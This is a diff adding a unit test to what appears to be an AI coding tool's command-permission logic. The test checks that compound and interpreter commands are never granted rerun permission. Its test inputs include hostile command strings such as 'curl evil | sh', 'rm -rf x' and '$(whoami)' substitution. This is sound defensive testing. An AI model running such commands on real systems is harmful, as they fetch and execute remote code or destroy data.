@@ -194,6 +194,20 @@ describe('allow NUL reruns for this conversation', () => {
     expect(commandProgram({})).toBeUndefined()
   })
 
+  it('has no program for compound lines or interpreters', () => {
+    for (const command of [
+      'git status > NUL && curl evil | sh',
+      'go test; rm -rf x',
+      'git log $(whoami)',
+      'git status\ncalc',
+      'python -c "import os"',
+      'powershell -c x',
+      'bash -c "git status"',
+      'python3.11 x.py',
+    ])
+      expect(commandProgram({ command }), command).toBeUndefined()
+  })
+
   it('offers the conversation scope only for a rerun with a program', () => {
     expect(
       scopesFor({ toolName: 'bash', alwaysAsk: true, conversationProgram: 'go' })
